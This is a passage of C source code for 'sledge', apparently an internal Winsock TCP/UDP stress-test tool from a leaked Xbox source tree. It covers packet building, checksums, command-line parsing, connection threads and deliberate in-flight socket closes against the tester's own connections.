        return (-1);
    }


    return(0);
}

//==================================================================================
// RandomRange
//----------------------------------------------------------------------------------
//
// Description: Generate a pseudo-random number
//
// Arguments:
//  ULONG           Min         Minimum random number desired
//  ULONG           Max         Maximum random number desired
// Returns:
//  ULONG containing the value of the generated random number
//==================================================================================
ULONG RandomRange(ULONG Min, ULONG Max)
{
    return((rand() % (Max - Min + 1)) + Min);
}

//==================================================================================
// BuildTestPacket
//----------------------------------------------------------------------------------
//
// Description: Generate a pseudo-random number
//
// Arguments:
//  CLIENT_CONNS    *pConn      Pointer to the clients CLIENT_CONNS struct
//  int             Len         Size of the buffer to fill
//  BYTE            Buff[]      Buffer to fill with data
//  int             nPacketNum  Number indicating the order this packet will be tx'd
// Returns:
//  ULONG containing the checksum of the generated packet
//==================================================================================
ULONG BuildTestPacket(CLIENT_CONNS *pConn, int Len, BYTE Buff[], int nPacketNum)
{
    ULONG CheckSum = 0;
    int   i = 0;

    Buff[i] = (BYTE) nPacketNum;
    CheckSum += Buff[i];
    i++;

    for (; i < Len; i++)
    {
        if(i == (Len - 1))
            Buff[i] = 0xAA;
        else
            Buff[i] = pConn->NextChar;

        if( g_ptTxDataType == INCREMENT )
        {
            if (pConn->NextChar == 'z')
                pConn->NextChar = 'a';
            else
                pConn->NextChar++;
        }
        else if ( g_ptTxDataType == RANDOM )
        {
            while((pConn->NextChar = (BYTE) (rand() & 0x000000ff)) == (BYTE) 0x1A);
        }


        CheckSum += Buff[i];
    }

    if ((pConn->NextChar >= 'z') || (pConn->NextChar < 'a'))
        pConn->NextChar = 'a';
    else
        pConn->NextChar++;


    return(CheckSum);
}

//==================================================================================
// BuildTestPacket
//----------------------------------------------------------------------------------
//
// Description: Calculate checksum over a buffer
//
// Arguments:
//  int             Len         Size of the buffer to calculate checksum over
//  BYTE            Buff[]      Buffer to calculate checksum over
// Returns:
//  ULONG containing the checksum of the buffer
//==================================================================================
ULONG CheckSum(int Len, BYTE Buff[])
{
    ULONG CheckSum = 0;
    int   i;

    for (i = 0; i < Len; i++)
    {
        CheckSum += Buff[i];
    }

    return(CheckSum);
}

//==================================================================================
// SignalTestExit
//----------------------------------------------------------------------------------
//
// Description: If we finish the test or encounter a critical error, signal to exit
//
// Arguments:
//  UINT            ExitCode    Code to return
// Returns:
//  none
//==================================================================================
void SignalTestExit(UINT ExitCode)
{
    g_fExit = TRUE;
    SetEvent(g_hCreateThreadsEvent);
}

//==================================================================================
// GetLastErrorText
//----------------------------------------------------------------------------------
//
// Description: Maps the last error to a string
//
// Arguments:
//  none
// Returns:
//  TCHAR string containing text representing the last error
//==================================================================================
CHAR * GetLastErrorText()
{
    switch (WSAGetLastError())
    {
    case WSAEINTR:
        return ("WSAEINTR");
        break;

    case WSAEBADF:
        return("WSAEBADF");
        break;

    case WSAEACCES:
        return("WSAEACCES");
        break;

    case WSAEFAULT:
        return("WSAEFAULT");
        break;

    case WSAEINVAL:
        return("WSAEINVAL");
        break;

    case WSAEMFILE:
        return("WSAEMFILE");
        break;

    case WSAEWOULDBLOCK:
        return("WSAEWOULDBLOCK");
        break;

    case WSAEINPROGRESS:
        return("WSAEINPROGRESS");
        break;

    case WSAEALREADY:
        return("WSAEALREADY");
        break;

    case WSAENOTSOCK:
        return("WSAENOTSOCK");
        break;

    case WSAEDESTADDRREQ:
        return("WSAEDESTADDRREQ");
        break;

    case WSAEMSGSIZE:
        return("WSAEMSGSIZE");
        break;

    case WSAEPROTOTYPE:
        return("WSAEPROTOTYPE");
        break;

    case WSAENOPROTOOPT:
        return("WSAENOPROTOOPT");
        break;

    case WSAEPROTONOSUPPORT:
        return("WSAEPROTONOSUPPORT");
        break;

    case WSAESOCKTNOSUPPORT:
        return("WSAESOCKTNOSUPPORT");
        break;

    case WSAEOPNOTSUPP:
        return("WSAEOPNOTSUPP");
        break;

    case WSAEPFNOSUPPORT:
        return("WSAEPFNOSUPPORT");
        break;

    case WSAEAFNOSUPPORT:
        return("WSAEAFNOSUPPORT");
        break;

    case WSAEADDRINUSE:
        return("WSAEADDRINUSE");
        break;

    case WSAEADDRNOTAVAIL:
        return("WSAEADDRNOTAVAIL");
        break;

    case WSAENETDOWN:
        return("WSAENETDOWN");
        break;

    case WSAENETUNREACH:
        return("WSAENETUNREACH");
        break;

    case WSAENETRESET:
        return("WSAENETRESET");
        break;

    case WSAECONNABORTED:
        return("WSAECONNABORTED");
        break;

    case WSAECONNRESET:
        return("WSAECONNRESET");
        break;

    case WSAENOBUFS:
        return("WSAENOBUFS");
        break;

    case WSAEISCONN:
        return("WSAEISCONN");
        break;

    case WSAENOTCONN:
        return("WSAENOTCONN");
        break;

    case WSAESHUTDOWN:
        return("WSAESHUTDOWN");
        break;

    case WSAETOOMANYREFS:
        return("WSAETOOMANYREFS");
        break;

    case WSAETIMEDOUT:
        return("WSAETIMEDOUT");
        break;

    case WSAECONNREFUSED:
        return("WSAECONNREFUSED");
        break;

    case WSAELOOP:
        return("WSAELOOP");
        break;

    case WSAENAMETOOLONG:
        return("WSAENAMETOOLONG");
        break;

    case WSAEHOSTDOWN:
        return("WSAEHOSTDOWN");
        break;

    case WSAEHOSTUNREACH:
        return("WSAEHOSTUNREACH");
        break;

    case WSAENOTEMPTY:
        return("WSAENOTEMPTY");
        break;

    case WSAEPROCLIM:
        return("WSAEPROCLIM");
        break;

    case WSAEUSERS:
        return("WSAEUSERS");
        break;

    case WSAEDQUOT:
        return("WSAEDQUOT");
        break;

    case WSAESTALE:
        return("WSAESTALE");
        break;

    case WSAEREMOTE:
        return("WSAEREMOTE");
        break;

    case WSAEDISCON:
        return("WSAEDISCON");
        break;

    case WSASYSNOTREADY:
        return("WSASYSNOTREADY");
        break;

    case WSAVERNOTSUPPORTED:
        return("WSAVERNOTSUPPORTED");
        break;

    case WSANOTINITIALISED:
        return("WSANOTINITIALISED");
        break;

    default:
        return("Unknown Error");
    }
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sledge\nt\ntsledge.cpp ===
//****************
//*** Includes ***
//****************
#include "ntsledge.h"

#include "stdio.h"
#include "stdlib.h"

//***************
//*** Defines ***
//***************
#undef MIN
#undef MAX
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define MAX_CLIENT_CONNS    50
#define MAX_LINE 80
#define MAX_SERV_CONNS      50

//***************
//*** Globals ***
//***************
LPCTSTR	cszThisFile = TEXT("sledge.cpp");

TCHAR *CONN_TYPES_Str[] =
{
    TEXT("TCP"),
		TEXT("UDP"),
};

SLEDGE_PARMS g_SledgeParms = 
{
    SERV_TCP,
	SERV_UDP,
	SERV_TCP_ADDR,
	SERV_UDP_ADDR,
	SERV_RECV_LEN,
	CLIENT_TCP_CONNS,
	CLIENT_TCP_CYCLES,
	CLIENT_UDP_CONNS,
	CLIENT_UDP_CYCLES,
	MIN_PACKET_LEN,
	MAX_PACKET_LEN,
	MIN_PACKET_LEN,
	MAX_PACKET_LEN,
	PACKETS_PER_CONN,
	CLIENT_PERCENT_SLEEPY_RECVS,
	SERV_PERCENT_SLEEPY_RECVS,
	UDP_SLEEP_BEFORE_NEXT,
	IN_FLIGHT_CLOSES
};

CRITICAL_SECTION g_csSledgeCritSection;
DWORD g_dwTotalPacketsIn = 0, g_dwTotalBytesIn = 0, g_dwLastTime;
HANDLE g_hCreateThreadsEvent;
CLIENT_CONNS g_ccClientConns[MAX_CLIENT_CONNS];
SERV_CONNS g_scServConns  [MAX_SERV_CONNS];
INT g_iServConns = 0, g_iClientConns = 0;
TCHAR g_lpszCfgFileName[MAX_LINE];
BOOL g_fIsServer = FALSE, g_fExit = FALSE, g_bFinished = FALSE, g_fVerbose = FALSE, g_fNonBlocking = FALSE;
PACKET_TYPE g_ptTxDataType = CONSTANT;

//*****************
//*** Functions ***
//*****************

//**********************************************
//*** TRACE - Function to print debug output ***
//**********************************************
void WINAPI TRACE(LPCTSTR szFormat, ...) {
	TCHAR szBuffer[1024] = TEXT("");
	va_list pArgs; 
	va_start(pArgs, szFormat);
	
	wvsprintf(szBuffer, szFormat, pArgs);
	
	va_end(pArgs);
#ifdef UNDER_CE
	OutputDebugString(szBuffer);
#else
	_tprintf(szBuffer);
#endif
}

//*****************************************************
//*** ParseCommandLine - Parse command line options ***
//*****************************************************
BOOL ParseCommandLine(INT argc, TCHAR *argv[])
{
	INT	i;
	LPTSTR	szCmdLine = NULL, szCurr = NULL, szTemp = NULL;
	DWORD	dwCmdLineSize = 0;
	struct hostent *hostp;
	DWORD dwIPAddr = 0;
	CHAR Address[40];
	BOOL fEOL = FALSE;

	// Determine size of fake command line...
	for(i = 0; i < argc; i++)
	{
		dwCmdLineSize += ((_tcslen(argv[i]) + 1) * sizeof(TCHAR));
	}

	szCmdLine = (LPTSTR) LocalAlloc(LPTR, dwCmdLineSize);
	memset(szCmdLine, 0, dwCmdLineSize);

	// Copy command line components into fake command line
	for(i = 0; i < argc; i++)
	{
		// if this is the first argument, we start with cpy
		if(!i)
		{
			_tcscpy(szCmdLine, argv[i]);
			_tcscat(szCmdLine, TEXT(" "));
		}
		// if this is the last argument, we don't need a space at the end
		else if(i == argc - 1)
		{
			_tcscat(szCmdLine, argv[i]);
		}
		// for all the "middle" arguments, we need to use cat and put a space at the end
		else
		{
			_tcscat(szCmdLine, argv[i]);
			_tcscat(szCmdLine, TEXT(" "));
		}		
	}

	szCurr = szCmdLine;
	
	while(*szCurr)
    {
		if ((*szCurr == TEXT('-')) || (*szCurr == TEXT('/')))
        {
			szCurr++;
			switch (*szCurr)
            {
			case TEXT('v'):
			case TEXT('V'):
				g_fVerbose = TRUE;
				TRACE(TEXT("Setting to verbose mode...\r\n"));
				break;
			case TEXT('n'):
			case TEXT('N'):
				g_fNonBlocking = TRUE;
				TRACE(TEXT("Setting to non-blocking mode...\r\n"));
				break;
			case TEXT('d'):
			case TEXT('D'):
				szCurr++;
				switch (*szCurr)
				{
				case TEXT('\0'):
					break;
				case TEXT('c'):
				case TEXT('C'):
					g_ptTxDataType = CONSTANT;
					TRACE(TEXT("Setting to packet type to CONSTANT...\r\n"));
					break;
				case TEXT('i'):
				case TEXT('I'):
					g_ptTxDataType = INCREMENT;
					TRACE(TEXT("Setting to packet type to INCREMENT...\r\n"));
					break;
				case TEXT('r'):
				case TEXT('R'):
					g_ptTxDataType = RANDOM;
					TRACE(TEXT("Setting to packet type to RANDOM...\r\n"));
					break;
				default:
					break;
				}
				break;
			case TEXT('s'):
			case TEXT('S'):
				szCurr++;
				g_fIsServer = TRUE;
				switch (*szCurr)
				{
				case TEXT('\0') :
					break;
				case TEXT('t') :
				case TEXT('T') :
					g_SledgeParms.ServTCP = TRUE;
					TRACE(TEXT("TCP Server Mode...\r\n"));
					break;
				case TEXT('u') :
				case TEXT('U') :
					g_SledgeParms.ServUDP = TRUE;
					TRACE(TEXT("UDP Server Mode...\r\n"));
					break;
				case TEXT('l') :
				case TEXT('L') :
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.ServRecvLen = _ttol(szCurr);
					TRACE(TEXT("Setting ServRecvLen to %d\r\n"),
						g_SledgeParms.ServRecvLen);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('s') :
				case TEXT('S') :
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.ServSleepyRecvs = _ttol(szCurr);
					TRACE(TEXT("Setting Server sleepy receives to %d\r\n"),
						g_SledgeParms.ServSleepyRecvs);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				default :
					usage();
					LocalFree(szCmdLine);
					return FALSE;
				}
				break;
			case TEXT('f'):
			case TEXT('F'):
				g_SledgeParms.InFlightCloses = TRUE;
				TRACE(TEXT("InFlight closes enabled\r\n"));
				break;
			case TEXT('p'):
			case TEXT('P'):
				szCurr++;
				while(*szCurr == TEXT(' '))
					szCurr++;
						
				g_SledgeParms.PacketsPerConn = _ttol (szCurr);
				TRACE(TEXT("Setting Packets Per Connection to %d\r\n"), g_SledgeParms.PacketsPerConn);
						
				while(*szCurr && (*szCurr != TEXT(' ')))
					szCurr++;
				break;
			case TEXT('t'):
			case TEXT('T'):
				szCurr++;
				switch(*szCurr)
				{
				case TEXT('c'):
				case TEXT('C'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.ClientTCPConns = _ttol (szCurr);
					TRACE(TEXT("Setting TCP Connections to %d\r\n"),
						g_SledgeParms.ClientTCPConns);
							
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('l'):
				case TEXT('L'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.ClientTCPCycles = _ttol (szCurr);
					TRACE(TEXT("Setting TCP Cycles to %d\r\n"), g_SledgeParms.ClientTCPCycles);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('a'):
				case TEXT('A'):
					dwIPAddr = 0;
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					if(!*szCurr || (*szCurr == TEXT('/')) || (*szCurr == TEXT('-')))
					{
						usage();
						LocalFree(szCmdLine);
						return FALSE;
					}
						for(szTemp = szCurr; (*szTemp && (*szTemp != TEXT(' '))); szTemp++);
					if(*szTemp)
						*szTemp = 0;
					else
						fEOL = TRUE;

#ifdef UNICODE
					wcstombs (Address, szCurr, _tcslen(szCurr)+1);
#else
					strcpy (Address, szCurr);
#endif
					if ((dwIPAddr = inet_addr(Address)) == -1L)
					{
						TRACE(TEXT("Host=0x%8x\r\n"), Address);
						if ((hostp = gethostbyname (Address)) != NULL)
						{
							dwIPAddr = *((long *)hostp->h_addr);
						}
					}
					if (dwIPAddr == 0)
					{
						TRACE(TEXT("Error setting dwIPAddr to '%a'\r\n"), Address);
					}
					TRACE(TEXT("TCP Addr=%hs(0x%X)\r\n"), Address, dwIPAddr);
					g_SledgeParms.ServTCPAddr = htonl(dwIPAddr);
					
					szCurr = szTemp;
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('m'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.TCPMinPacketLen = _ttol (szCurr);
					TRACE(TEXT("Setting TCP packets minimum length to %d\r\n"), g_SledgeParms.TCPMinPacketLen);
					
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('M'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.TCPMaxPacketLen = _ttol (szCurr);
					TRACE(TEXT("Setting TCP packets maximum length to %d\r\n"), g_SledgeParms.TCPMaxPacketLen);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
					
				default :
					usage();
					LocalFree(szCmdLine);
					return FALSE;
			}
			break;
			case TEXT('u'):
			case TEXT('U'):
				szCurr++;
				switch (*szCurr)
				{
				case TEXT('c'):
				case TEXT('C'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
							
					g_SledgeParms.ClientUDPConns = _ttol (szCurr);
					if(g_SledgeParms.ClientUDPConns > 1)
						g_SledgeParms.ClientUDPConns = 1;
					TRACE(TEXT("Setting UDP Connections to %d\r\n"), g_SledgeParms.ClientUDPConns);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('l'):
				case TEXT('L'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
						
					g_SledgeParms.ClientUDPCycles = _ttol (szCurr);
					TRACE(TEXT("Setting UDP Cycles to %d\r\n"), g_SledgeParms.ClientUDPCycles);
						
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('a'):
				case TEXT('A'):
					dwIPAddr = 0;
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
							
					if(!*szCurr || (*szCurr == TEXT('/')) || (*szCurr == TEXT('-')))
					{
						usage();
						LocalFree(szCmdLine);
						return FALSE;
					}
					
					for(szTemp = szCurr; (*szTemp && (*szTemp != TEXT(' '))); szTemp++);
					if(*szTemp)
						*szTemp = 0;
					else
						fEOL = TRUE;

#ifdef UNICODE
					wcstombs (Address, szCurr, _tcslen(szCurr)+1);
#else								
					strcpy (Address, szCurr);
#endif
					if ((dwIPAddr = inet_addr(Address)) == -1L)
					{
						TRACE(TEXT("Host='%a'\r\n"), Address);
						if ((hostp = gethostbyname (Address)) != NULL)
						{
							dwIPAddr = *((long *)hostp->h_addr);
						}
					}
					if (dwIPAddr == 0)
					{
						TRACE(TEXT("Error setting dwIPAddr to '%a'\r\n"), Address);
					}
					TRACE(TEXT("UDP Addr=%hs(0x%X)\r\n"),
						Address, dwIPAddr);
					g_SledgeParms.ServUDPAddr = htonl(dwIPAddr);
							
					szCurr = szTemp;
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('m'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
								
					g_SledgeParms.UDPMinPacketLen = _ttol (szCurr);
					TRACE(TEXT("Setting UDP packets minimum length to %d\r\n"),
						g_SledgeParms.UDPMinPacketLen);
								
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('M'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
							
					g_SledgeParms.UDPMaxPacketLen = _ttol (szCurr);
					TRACE(TEXT("Setting UDP packets maximum length to %d\r\n"),
						g_SledgeParms.UDPMaxPacketLen);
							
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				case TEXT('s'):
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
							
					g_SledgeParms.UDPSleepBeforeNext = _ttol (szCurr);
					TRACE(TEXT("Setting UDP sleeping time between datagrams to %d\r\n"),
						g_SledgeParms.UDPMaxPacketLen);
								
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;
				default :
					usage();
					LocalFree(szCmdLine);
					return FALSE;
				}
				break;
			case TEXT('c'):
			case TEXT('C'):
				szCurr++;
				switch (*szCurr)
				{
				case TEXT('s') :
				case TEXT('S') :
					szCurr++;
					while(*szCurr == TEXT(' '))
						szCurr++;
								
					g_SledgeParms.ClientSleepyRecvs = _ttol(szCurr);
					TRACE(TEXT("Setting Client sleepy receives to %d\r\n"),
						g_SledgeParms.ClientSleepyRecvs);
									
					while(*szCurr && (*szCurr != TEXT(' ')))
						szCurr++;
					break;                    
				default :
					usage();
					LocalFree(szCmdLine);
					return FALSE;
				}
				break;
			default :
				TRACE(TEXT("Bad argument '%c'\r\n"), *szCurr);
				usage();
				LocalFree(szCmdLine);
				return FALSE;
			}
		}

		if(fEOL)
			break;

		szCurr++;
	}


	if(g_fIsServer)
    {
        g_SledgeParms.ClientTCPConns    = 0;
        g_SledgeParms.ClientUDPConns    = 0;
    }
    else
    {
        g_SledgeParms.ServTCP           = FALSE;
        g_SledgeParms.ServUDP           = FALSE;
    }
	
	g_iClientConns = g_SledgeParms.ClientTCPConns + g_SledgeParms.ClientUDPConns;
	
	LocalFree(szCmdLine);

	return TRUE;
}

//****************************************************
//*** VerifyValidParams - Verify valid test params ***
//****************************************************
BOOL VerifyValidParams()
{
	if(g_iClientConns > MAX_CLIENT_CONNS)
	{
		TRACE(TEXT("Max connections (%d) exceeded\r\n"), MAX_CLIENT_CONNS);
		return FALSE;
	}
	
    if (g_SledgeParms.TCPMaxPacketLen > PACKET_MAX_LEN)
    {
		TRACE(TEXT("TCPMaxPacketLen (%u) > PACKET_MAX_LEN (%u)\r\n"), g_SledgeParms.TCPMaxPacketLen, PACKET_MAX_LEN);
        return FALSE;
    }
	
	if  (g_SledgeParms.ServRecvLen > PACKET_MAX_LEN)
	{
		TRACE(TEXT("ServRecvLen (%u) > PACKET_MAX_LEN (%u)\r\n"), g_SledgeParms.ServRecvLen, PACKET_MAX_LEN);
        return FALSE;
	}

	return TRUE;
}

//********************************************************
//*** StartNonClientThreads - Start non-client threads ***
//********************************************************
BOOL StartNonClientThreads()
{
    HANDLE  hThread;
    DWORD   dwThreadId;

	//Start the DisplayThread
	if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DisplayThread, NULL, 0, &dwThreadId)) == NULL)
	{
		TRACE(TEXT("Sledge: CreateThread(DisplayThread) failed %d\r\n"), GetLastError());
		return FALSE;
	}
	
	//If necessary, start the HatchetThread
    if (g_SledgeParms.InFlightCloses)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) HatchetThread, NULL, 0, &dwThreadId)) == NULL)
        {
            TRACE(TEXT("Sledge: CreateThread(Hatchet) failed %d\r\n"), GetLastError());
            return FALSE;
        }
		
        CloseHandle(hThread);
    }

	//If necessary, start the TCPServThread
    if (g_SledgeParms.ServTCP)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) TCPServThread, NULL, 0, &dwThreadId)) == NULL)
        {
            TRACE(TEXT("Sledge[%s]: CreateThread(TCPServThread) failed %d\r\n"), CONN_TYPES_Str[CONN_TCP], GetLastError());
            return FALSE;
        }
		
        CloseHandle(hThread);
    }
	
	//If necessary, start the UDPServThread
    if (g_SledgeParms.ServUDP)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) UDPServThread, NULL, 0, &dwThreadId)) == NULL)
        {
            TRACE(TEXT("Sledge[%s]: CreateThread(UDPServThread) failed %d\r\n"), CONN_TYPES_Str[CONN_UDP], GetLastError());
            return FALSE;
        }
		
        CloseHandle(hThread);
    }

	return TRUE;
}

//********************************************************************
//*** IsSledgeComplete - Determine if the current test is complete ***
//********************************************************************
BOOL IsSledgeComplete()
{
	INT iConn;

    EnterCriticalSection(&g_csSledgeCritSection);

	// If any sockets haven't reached their total cycles or any are still connected, the test isn' over
	for (iConn = 0; iConn < g_iClientConns; iConn++)
	{
		if (g_ccClientConns[iConn].Cycle != g_ccClientConns[iConn].Cycles || g_ccClientConns[iConn].Connected)
		{
			LeaveCriticalSection(&g_csSledgeCritSection);
			return FALSE;
		}
	}
	
	// If this is a server test, then the test isn't over
	if (g_SledgeParms.ServTCP || g_SledgeParms.ServUDP)
	{
		LeaveCriticalSection(&g_csSledgeCritSection);
		return FALSE;
	}

	LeaveCriticalSection(&g_csSledgeCritSection);
	return TRUE;
}

//*********************************************
//*** WinMain - Entry point for application ***
//*********************************************
int _cdecl _tmain(INT argc, TCHAR *argvW[])
{
	INT		iConn;
    WORD    WSAVerReq = MAKEWORD(1,1);
    WSADATA WSAData;
	
    BOOL    fSuccess = TRUE;
	HANDLE	hThread;
	DWORD	dwThreadId;
	
	// Initialize the winsock layer
    if (WSAStartup(WSAVerReq, &WSAData) != 0)
    {
		TRACE(TEXT("Sledge: WSAStartup() failed\r\n"));
        return FALSE;
    }

	// Parse the command line
	if(!ParseCommandLine(argc, argvW))
	{
		fSuccess = FALSE;
		goto ExitMain;
	}

	// Verify that the test parameters are valid
	if(!VerifyValidParams())
	{
		fSuccess = FALSE;
		goto ExitMain;
	}

	InitializeCriticalSection(&g_csSledgeCritSection);
	
    if ((g_hCreateThreadsEvent = CreateEvent(NULL, FALSE, TRUE, NULL)) == NULL) 
    {	
        TRACE(TEXT("Sledge: CreateEvent(g_hCreateThreadsEvent) failed %d\r\n"), GetLastError());
        return FALSE;
    }
    
	// Initialize server connection structures
    for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
    {
        memset(&g_scServConns[iConn], 0, sizeof(SERV_CONNS));
        g_scServConns[iConn].ConnType         = CONN_IDLE;
        g_scServConns[iConn].Index            = iConn;
        g_scServConns[iConn].PacketLenMin     = 9999;
    }

	if(g_iClientConns)
		TRACE(TEXT("%d connection(s) to initialize\r\n"), g_iClientConns);
	
	// Initialize client connection structures
    for (iConn = 0; iConn < g_iClientConns; iConn++)
    {
        memset(&g_ccClientConns[iConn], 0, sizeof(CLIENT_CONNS));
        g_ccClientConns[iConn].Index          = iConn;
        g_ccClientConns[iConn].Connected      = FALSE;
        g_ccClientConns[iConn].SendThreadDown = FALSE;
        g_ccClientConns[iConn].RecvThreadDown = FALSE;
        g_ccClientConns[iConn].PacketLenMin   = 9999;
        g_ccClientConns[iConn].NextChar       = 'a';
		g_ccClientConns[iConn].TotalLatePackets = 0;
		g_ccClientConns[iConn].TotalLostPackets = 0;
		g_ccClientConns[iConn].TotalBadPackets = 0;

		if (iConn < g_SledgeParms.ClientUDPConns)
        {
            g_ccClientConns[iConn].ConnType = CONN_UDP;
            g_ccClientConns[iConn].Cycles   = g_SledgeParms.ClientUDPCycles;
        }
        else
        {
            g_ccClientConns[iConn].ConnType = CONN_TCP;
            g_ccClientConns[iConn].Cycles   = g_SledgeParms.ClientTCPCycles;
        }
		
        
        if ((g_ccClientConns[iConn].hPacketsOutEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
        {	
            TRACE(TEXT("Sledge[%d]: CreateEvent(hPacketsOutEvent) failed %d\r\n"), iConn, GetLastError());
            return FALSE;
        }
    }

	// Start all non-client threads
	if(!StartNonClientThreads())
	{
		fSuccess = FALSE;
		goto ExitMain;
	}
	
    while (1)
    {
		// Wait for a signal that we need to restart a thread
        WaitForSingleObject(g_hCreateThreadsEvent, INFINITE);
		
		// See if the global test exit condition has been triggered
        if (g_fExit)
		{
			g_bFinished = TRUE;
            goto ExitMain;
		}
		
		// If the test is complete, then exit
		if(IsSledgeComplete())
		{
			TRACE(TEXT("Sledge: exiting normally\r\n"));
			g_bFinished = TRUE;
			goto ExitMain;
		}
		
		EnterCriticalSection(&g_csSledgeCritSection);

		// Scan for sockets that need to be restarted
		for (iConn = 0; iConn < g_iClientConns; iConn++)
		{
			if ((g_ccClientConns[iConn].Cycle < g_ccClientConns[iConn].Cycles) &&
				! g_ccClientConns[iConn].Connected)
			{
				// Reset the connection parameters for each socket that needs to be restarted
				g_ccClientConns[iConn].Cycle = (g_ccClientConns[iConn].Cycle + 1) % INFINITE_CYCLES;
				g_ccClientConns[iConn].PacketLenMin    = 9999;
				g_ccClientConns[iConn].PacketLenMax    = 0;
				g_ccClientConns[iConn].TotalPacketsOut = 0;
				g_ccClientConns[iConn].TotalBytesOut   = 0;
				g_ccClientConns[iConn].DeltaBytesOut   = 0;
				g_ccClientConns[iConn].TotalPacketsIn  = 0;
				g_ccClientConns[iConn].TotalBytesIn    = 0;
				g_ccClientConns[iConn].DeltaBytesIn    = 0;
				g_ccClientConns[iConn].PacketsOutHead  = 0;
				g_ccClientConns[iConn].PacketsOutTail  = 0;
				g_ccClientConns[iConn].PacketsOutCount = 0;
				g_ccClientConns[iConn].SendThreadDown  = FALSE;
				g_ccClientConns[iConn].RecvThreadDown  = FALSE;
				g_ccClientConns[iConn].SleepyRecv      = FALSE;
				g_ccClientConns[iConn].InSend          = FALSE;
				g_ccClientConns[iConn].InRecv          = FALSE;
				g_ccClientConns[iConn].InClose         = FALSE;
				g_ccClientConns[iConn].NextChar        = 'a';
				
				// Connect the socket
				OpenConn(&g_ccClientConns[iConn]);
				
				// Spawn the receive thread for the socket
				if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientRecvThread, &g_ccClientConns[iConn], 0, &dwThreadId)) == NULL)
				{
					TRACE(TEXT("Sledge[%d,%s]: CreateThread(ClientRecvThread) failed %d\r\n"),
						iConn,
						CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
						GetLastError());
					
					return FALSE;
				}
				
				CloseHandle(hThread);
				
				// Spawn the send thread for the socket
				if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientSendThread, &g_ccClientConns[iConn], 0, &dwThreadId)) == NULL)
				{
					TRACE(TEXT("Sledge[%d,%s]: CreateThread(ClientSendThread) failed %d\r\n"),
						iConn, 
						CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
						GetLastError());
					
					return FALSE;
				}
				
				CloseHandle(hThread);
			}
		}
		
		LeaveCriticalSection(&g_csSledgeCritSection);
    }
	
ExitMain:
	
	Sleep(5000);
	
	return fSuccess;
	
}            

//*******************************************************************************************
//*** IsValidForHatchet - Helper function for HatchetThread that determines if connection ***
//***    can be killed                                                                    ***
//*******************************************************************************************
BOOL IsValidForHatchet(CLIENT_CONNS *pClient)
{
	//If less than half the packets have been sent, then we can't kill
	if(pClient->TotalPacketsOut <= (unsigned) g_SledgeParms.PacketsPerConn / 2)
		return FALSE;

	//If the connection is already broken, then we can't kill
	if(pClient->Connected)
		return FALSE;
	
	//If either thread is down, then we can't kill
	if(pClient->SendThreadDown || pClient->RecvThreadDown)
		return FALSE;

	return TRUE;
}

//************************************************************************************
//*** HatchetThread - Thread that kills connections if InFlightCloses is turned on ***
//************************************************************************************
DWORD WINAPI HatchetThread(LPVOID *pParm)
{
    int iConn;
    
    while(1)
    {
        Sleep(1000);
		
		EnterCriticalSection(&g_csSledgeCritSection);
		
		//Look for hatchet victims
        for (iConn = 0; iConn < g_iClientConns; iConn++)
        {
            switch(g_ccClientConns[iConn].ConnType)
            {
			case CONN_TCP:
			case CONN_UDP:
				//If we find a valid victim, kill it
                if(IsValidForHatchet(&(g_ccClientConns[iConn])))
                {
                    TRACE(TEXT("Sledge[%d,%s]: in-flight closesocket()\r\n"),
						g_ccClientConns[iConn].Index, 
						CONN_TYPES_Str[g_ccClientConns[iConn].ConnType]);
					
                    g_ccClientConns[iConn].InClose = TRUE;
					
                    if (closesocket(g_ccClientConns[iConn].Sock) == SOCKET_ERROR)
